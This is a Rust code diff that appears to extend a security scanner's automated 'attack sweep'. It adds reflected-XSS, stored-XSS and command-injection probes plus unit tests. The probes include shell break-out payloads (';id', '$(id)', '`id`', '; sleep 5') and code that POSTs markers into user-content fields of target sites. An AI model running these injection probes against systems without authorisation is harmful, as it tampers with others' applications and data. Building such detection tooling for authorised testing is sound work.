@@ -288,6 +288,165 @@ fn sweep_collect_get_urls(
     urls
 }
 
+/// Send one payload spliced into the injection point; return (status, body). Shared
+/// by the XSS / command-injection passes (the SQLi pass keeps its own timed closure).
+fn sweep_send(
+    client: &reqwest::blocking::Client,
+    point: &InjectionPoint,
+    payload: &str,
+) -> Option<(u16, String)> {
+    let resp = if let Some(param) = &point.query_param {
+        let url = sqli_inject_url(&point.url, param, "{{INJ}}", payload).ok()?;
+        client.request(http_method(&point.method), &url).send().ok()?
+    } else if let (Some(field), Some(base)) = (&point.body_field, &point.base_body) {
+        let mut body = base.clone();
+        if let Some(obj) = body.as_object_mut() {
+            let base_val = obj.get(field).and_then(JsonValue::as_str).unwrap_or("test").to_string();
+            obj.insert(field.clone(), JsonValue::String(format!("{base_val}{payload}")));
+        }
+        client
+            .request(http_method(&point.method), &point.url)
+            .header(reqwest::header::CONTENT_TYPE, "application/json")
+            .body(body.to_string())
+            .send()
+            .ok()?
+    } else {
+        return None;
+    };
+    let status = resp.status().as_u16();
+    let mut buf = Vec::new();
+    let _ = std::io::Read::take(resp, 262_144).read_to_end(&mut buf);
+    Some((status, String::from_utf8_lossy(&buf).into_owned()))
+}
+
+/// Reflected-XSS signal: our angle-bracket marker comes back VERBATIM (unencoded) in
+/// the SAME response. An app that HTML-encodes it (`&lt;…&gt;`) never trips this.
+fn xss_marker_reflected(body: &str, raw_marker: &str) -> bool {
+    body.contains(raw_marker)
+}
+
+/// Reflected-XSS probe: inject a unique `<ovrx…>` marker and check it is echoed back
+/// with the angle brackets intact. Reported, but at LOW severity — many SRC programs
+/// don't accept reflected XSS; STORED XSS (below) is the high-value class. Both kept.
+fn sweep_probe_xss(client: &reqwest::blocking::Client, point: &InjectionPoint) -> Option<JsonValue> {
+    let digest = format!("{:x}", Sha256::digest(point.label.as_bytes()));
+    let marker = format!("<ovrx{}>", &digest[..8]);
+    let (_status, body) = sweep_send(client, point, &marker)?;
+    if xss_marker_reflected(&body, &marker) {
+        Some(serde_json::json!({
+            "point": point.label, "method": point.method, "url": point.url,
+            "marker": marker, "reflectedUnencoded": true,
+        }))
+    } else {
+        None
+    }
+}
+
+// ---- Stored XSS (the high-value class) ----
+
+// Body-field names that hold user-authored content later shown to other users — the
+// low-harm write targets worth planting a stored-XSS marker in (name/comment/review/
+// feedback/bio), as opposed to credential / price / role / id fields we must not
+// write to. This is the "intelligently pick the low-harm endpoint to POST into" part.
+const STORED_XSS_CONTENT_FIELDS: &[&str] = &[
+    "name", "nick", "username", "displayname", "comment", "message", "feedback",
+    "review", "title", "subject", "bio", "about", "description", "content", "text",
+    "body", "note", "address", "company", "remark", "signature", "caption",
+];
+
+fn is_stored_xss_content_field(field: &str) -> bool {
+    let f = field.to_ascii_lowercase();
+    STORED_XSS_CONTENT_FIELDS.iter().any(|k| f.contains(k))
+}
+
+/// Stored-XSS signal: a marker we POSTed earlier comes back with its angle brackets
+/// intact on a LATER read (persisted + rendered raw). An app that HTML-encodes on
+/// output (`&lt;…&gt;`) never trips this. Pure for testing.
+fn stored_xss_marker_persisted(display_body: &str, raw_marker: &str) -> bool {
+    display_body.contains(raw_marker)
+}
+
+/// Stored-XSS probe: only for a user-content body field. POST a unique `<ovrx…>`
+/// marker into it, then look for that marker unencoded in the POST response and in
+/// each candidate display surface (a later GET). A persisted, unencoded marker is
+/// stored XSS. The marker is a benign, non-executing token (proof-mode write).
+fn sweep_probe_stored_xss(
+    client: &reqwest::blocking::Client,
+    point: &InjectionPoint,
+    display_urls: &[String],
+) -> Option<JsonValue> {
+    let field = point.body_field.as_ref()?;
+    if !is_stored_xss_content_field(field) {
+        return None;
+    }
+    let digest = format!("{:x}", Sha256::digest(point.label.as_bytes()));
+    let marker = format!("<ovrx{}>", &digest[..8]);
+    let (post_status, post_body) = sweep_send(client, point, &marker)?;
+    // Some apps echo the created record straight back — that counts as stored+unencoded.
+    if stored_xss_marker_persisted(&post_body, &marker) {
+        return Some(serde_json::json!({
+            "point": point.label, "field": field, "marker": marker,
+            "surface": "post_response", "postStatus": post_status,
+        }));
+    }
+    // Otherwise read the display surfaces (the same collection's listing, discovered
+    // GET endpoints) and look for the persisted marker.
+    for url in display_urls.iter().take(40) {
+        let Ok(resp) = client.get(url).header(reqwest::header::USER_AGENT, "oviraptor-sweep/1.0").send() else { continue };
+        let mut buf = Vec::new();
+        let _ = std::io::Read::take(resp, 262_144).read_to_end(&mut buf);
+        if stored_xss_marker_persisted(&String::from_utf8_lossy(&buf), &marker) {
+            return Some(serde_json::json!({
+                "point": point.label, "field": field, "marker": marker,
+                "surface": url, "postStatus": post_status,
+            }));
+        }
+    }
+    None
+}
+
+/// Command-injection signal: the output of `id` (`uid=NNN… gid=NNN…`) appears in the
+/// response — unambiguous proof the shell ran our command.
+fn cmdi_output_present(body: &str) -> bool {
+    if let Some(i) = body.find("uid=") {
+        let digits = body[i + 4..].chars().take_while(|c| c.is_ascii_digit()).count();
+        return digits >= 1 && body[i..].contains("gid=");
+    }
+    false
+}
+
+/// Command-injection probe: a small canonical set of shell break-outs running `id`
+/// (echo signal), then a time-based fallback (`; sleep 5`). Detection only — it runs
+/// the harmless `id` / `sleep`, never a destructive command.
+fn sweep_probe_cmdi(client: &reqwest::blocking::Client, point: &InjectionPoint) -> Option<JsonValue> {
+    for payload in [";id", "|id", "$(id)", "`id`", "&&id"] {
+        if let Some((_status, body)) = sweep_send(client, point, payload) {
+            if cmdi_output_present(&body) {
+                return Some(serde_json::json!({
+                    "point": point.label, "method": point.method, "url": point.url,
+                    "payload": payload, "signal": "id_output",
+                }));
+            }
+        }
+    }
+    // Time-based blind fallback: a 5s sleep that moves the response time proves
+    // injection even with no echoed output.
+    let timed_ms = |payload: &str| -> Option<i64> {
+        let started = std::time::Instant::now();
+        let _ = sweep_send(client, point, payload)?;
+        Some(started.elapsed().as_millis() as i64)
+    };
+    let base = timed_ms("")?;
+    let timed = timed_ms("; sleep 5")?;
+    if timed >= base + 3500 && timed >= 3500 {
+        return Some(serde_json::json!({
+            "point": point.label, "method": point.method, "url": point.url,
+            "signal": "time_delay", "baselineMs": base, "timedMs": timed,
+        }));
+    }
+    None
+}
+
 /// Code-driven SQL-injection sweep over the scan's recon-discovered endpoints.
 /// Returns the number of injectable points confirmed (findings written).
 #[tauri::command]
@@ -401,15 +560,76 @@ pub fn run_attack_sweep(
         }
     }
 
+    // Pass 3a — reflected XSS: kept, but LOW severity (many SRC don't accept it).
+    let mut reflected_findings = 0usize;
+    for point in &points {
+        let Some(evidence) = sweep_probe_xss(&client, point) else { continue };
+        reflected_findings += 1;
+        let record = serde_json::json!({
+            "evidence": evidence, "cwe": "CWE-79",
+            "detail": "注入的 <ovrx..> 标记在同一响应中未编码回显，反射型 XSS（低危）",
+        });
+        let _ = connection.execute(
+            "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
+             VALUES(?1,?2,'attack','reflected_xss',?3,?4,'low',?5) \
+             ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
+             title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
+            params![scan_id, base_url, point.label, format!("反射型 XSS(低危)：{}", point.label), record.to_string()],
+        );
+    }
+
+    // Pass 3b — STORED XSS (high value): POST a benign marker into user-content fields
+    // and confirm it persists unencoded on a display surface (the discovered GET
+    // endpoints). This is the XSS class that actually matters.
+    let mut xss_findings = 0usize;
+    for point in &points {
+        let Some(evidence) = sweep_probe_stored_xss(&client, point, &get_urls) else { continue };
+        xss_findings += 1;
+        let record = serde_json::json!({
+            "evidence": evidence, "cwe": "CWE-79",
+            "detail": "POST 的 <ovrx..> 标记被持久化且未编码渲染，存在存储型 XSS",
+        });
+        let _ = connection.execute(
+            "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
+             VALUES(?1,?2,'attack','stored_xss',?3,?4,'high',?5) \
+             ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
+             title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
+            params![scan_id, base_url, point.label, format!("存储型 XSS：{}", point.label), record.to_string()],
+        );
+    }
+
+    // Pass 4 — command injection over the same points: `id` echo signal, then a
+    // time-based blind fallback. Detection only (runs id / sleep, nothing destructive).
+    let mut cmdi_findings = 0usize;
+    for point in &points {
+        let Some(evidence) = sweep_probe_cmdi(&client, point) else { continue };
+        cmdi_findings += 1;
+        let record = serde_json::json!({
+            "evidence": evidence, "cwe": "CWE-78",
+            "detail": "命令注入：id 输出回显或注入 sleep 造成可测时间延迟",
+        });
+        let _ = connection.execute(
+            "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
+             VALUES(?1,?2,'attack','command_injection',?3,?4,'critical',?5) \
+             ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
+             title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
+            params![scan_id, base_url, point.label, format!("命令注入：{}", point.label), record.to_string()],
+        );
+    }
+
+    let total = injectable + access_findings + reflected_findings + xss_findings + cmdi_findings;
     Ok(serde_json::json!({
         "probed": probed,
         "pointsDiscovered": points.len(),
         "injectable": injectable,
         "endpointsChecked": get_urls.len(),
         "accessFindings": access_findings,
-        "injectable_total": injectable + access_findings,
-        "hint": if injectable + access_findings > 0 {
-            "已写入 attack 发现(SQL 注入 / 越权 / 敏感泄露),附证据"
+        "reflectedXssFindings": reflected_findings,
+        "storedXssFindings": xss_findings,
+        "cmdiFindings": cmdi_findings,
+        "injectable_total": total,
+        "hint": if total > 0 {
+            "已写入 attack 发现(SQL 注入 / 越权 / 敏感泄露 / 反射 XSS(低) / 存储 XSS / 命令注入),附证据"
         } else {
             "本轮未发现;可能 recon 接口不足或需登录态。先跑一次扫描让 recon 收集更多接口"
         },
@@ -498,5 +718,41 @@ mod attack_sweep_tests {
         assert!(points.iter().any(|p| p.body_field.as_deref() == Some("email")), "{labels:?}");
         assert!(points.iter().any(|p| p.body_field.as_deref() == Some("password")), "{labels:?}");
         assert!(!points.iter().any(|p| p.url.contains("evil.example")), "off-origin must be dropped: {labels:?}");
+    }
+
+    #[test]
+    fn xss_reflection_needs_unencoded_marker() {
+        let marker = "<ovrxdeadbeef>";
+        // Verbatim angle brackets → reflected (the injected tag would render).
+        assert!(xss_marker_reflected("hello <ovrxdeadbeef> world", marker));
+        // HTML-encoded by the app → not reflected (safe).
+        assert!(!xss_marker_reflected("hello &lt;ovrxdeadbeef&gt; world", marker));
+        // Absent → not reflected.
+        assert!(!xss_marker_reflected("nothing here", marker));
+    }
+
+    #[test]
+    fn cmdi_detects_id_output_only() {
+        assert!(cmdi_output_present("uid=0(root) gid=0(root) groups=0(root)"));
+        assert!(cmdi_output_present("...\nuid=1000(app) gid=1000(app)\n..."));
+        // A bare mention without the numeric uid/gid pair is not proof.
+        assert!(!cmdi_output_present("the uid field is empty"));
+        assert!(!cmdi_output_present("normal json response {\"ok\":true}"));
+    }
+
+    #[test]
+    fn stored_xss_targets_content_fields_and_detects_persistence() {
+        // Intelligently pick low-harm user-content fields to write into…
+        assert!(is_stored_xss_content_field("comment"));
+        assert!(is_stored_xss_content_field("displayName"));
+        assert!(is_stored_xss_content_field("review"));
+        assert!(is_stored_xss_content_field("bio"));
+        // …not credential / price / role fields.
+        assert!(!is_stored_xss_content_field("password"));
+        assert!(!is_stored_xss_content_field("price"));
+        assert!(!is_stored_xss_content_field("role"));
+        // Persistence = the POSTed marker survives UNENCODED on a later read.
+        assert!(stored_xss_marker_persisted("<li><ovrxabc12345></li>", "<ovrxabc12345>"));
+        assert!(!stored_xss_marker_persisted("<li>&lt;ovrxabc12345&gt;</li>", "<ovrxabc12345>"));
     }
 }
